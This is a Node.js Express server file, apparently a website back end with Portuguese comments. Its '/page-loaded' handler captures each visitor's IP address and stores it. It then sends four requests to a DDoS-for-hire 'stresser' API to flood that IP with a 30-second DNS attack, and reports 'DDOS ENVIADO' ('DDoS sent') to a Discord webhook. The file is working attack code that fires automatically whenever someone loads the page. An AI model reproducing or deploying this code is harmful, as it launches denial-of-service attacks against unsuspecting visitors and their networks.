const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const compression = require('compression');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const app = express();
const port = process.env.PORT || 4000;
const token = process.env.TOKEN;
const ping = require('net-ping');

const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
const configFile = path.join(__dirname, 'data', 'config.json');
const discordWebhookUrl = process.env.WEBHOOK;
let lock = false;
let visitorsCache = [];
let configCache = { lastCleanup: new Date().toISOString() };

app.use(compression());
app.use(helmet());

app.set('trust proxy', 1);

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, 
    max: 100, 
});
app.use(limiter);

async function loadCache() {
    try {
        const [visitorsData, configData] = await Promise.all([fs.readFile(visitorsFile), fs.readFile(configFile)]);
        visitorsCache = JSON.parse(visitorsData);
        configCache = JSON.parse(configData);
    } catch (err) {
        if (err.code === 'ENOENT') {
            if (!configCache) {
                configCache = { lastCleanup: new Date().toISOString() };
                await fs.writeFile(configFile, JSON.stringify(configCache, null, 2));
            }
        } else {
            console.error('Error loading cache:', err);
        }
    }
}

async function clear() {
    try {
        await fs.writeFile(visitorsFile, JSON.stringify([]));
    } catch (err) {
        console.error('Error clearing visitors file:', err);
    }
}

async function sendApiRequest(ip) {
    const url = `https://api.vacstresser.ru/api?key=${token}&ip=${ip}&port=80&time=30&method=DNS`;
    const requests = Array(4).fill(url).map(u => axios.get(u));
    
    try {
        await axios.all(requests);
        console.log(`Requisição enviada para o IP: ${ip}`);
    } catch (error) {
        // Verifica se há uma resposta de erro
        if (error.response) {
            // O erro tem uma resposta com dados
            const status = error.response.data.status;
            const errorMessage = error.response.data.message || 'Mensagem de erro não disponível';
            if (status === 'error') {
                console.error(`Erro ao enviar requisição para o IP: ${ip}. Mensagem: ${errorMessage}`);
            } else {
                console.log(`Resposta da API para o IP: ${ip}. Status: ${status}`);
            }
        } else if (error.request) {
            // A requisição foi feita, mas não houve resposta
            console.error(`Erro ao enviar requisição para o IP: ${ip}. Sem resposta da API.`);
        } else {
            // Erro ao configurar a requisição
            console.error(`Erro ao configurar a requisição para o IP: ${ip}. Mensagem: ${error.message}`);
        }
    }
}

async function sendDiscordWebhooks(ip) {
    const webhook2 = axios.post(discordWebhookUrl, {
        embeds: [{
            title: 'DDOS ENVIADO',
            description: `Ataque enviado.`,
            color: 5814783,
            fields: [
                { name: 'IP', value: ip, inline: true }
            ],
            timestamp: new Date()
        }]
    });

    try {
        await webhook2;
    } catch (error) {
        console.error('Erro ao enviar webhooks:', error.message);
    }
}



app.post('/page-loaded', async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (typeof ip === 'string') ip = ip.split(',')[0].trim();
    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('::') || ip.startsWith('191.13.1')) {
        return res.status(400).send('Invalid IP');
    }

    let timestamp = new Date().toISOString();

    if (lock) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    lock = true;

    try {
        const ipEntry = visitorsCache.find(visitor => visitor.ip === ip);

        if (!ipEntry) {
            visitorsCache.push({ ip, timestamp });
            await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
        }

        //await verificar();
        await sendApiRequest(ip);
        await sendDiscordWebhooks(ip, timestamp);
        
        res.status(200).send('Process completed');

    } catch (err) {
        console.error('Error processing visitors:', err);
        res.status(500).send('Internal Server Error');
    } finally {
        lock = false;
    }
});




app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));
app.use('/admin', require('./routes/admin'));
app.use((req, res, next) => {res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
    loadCache().catch(err => console.error('Error loading cache on startup:', err));
});

setInterval(clear, 1000 * 60 * 60);
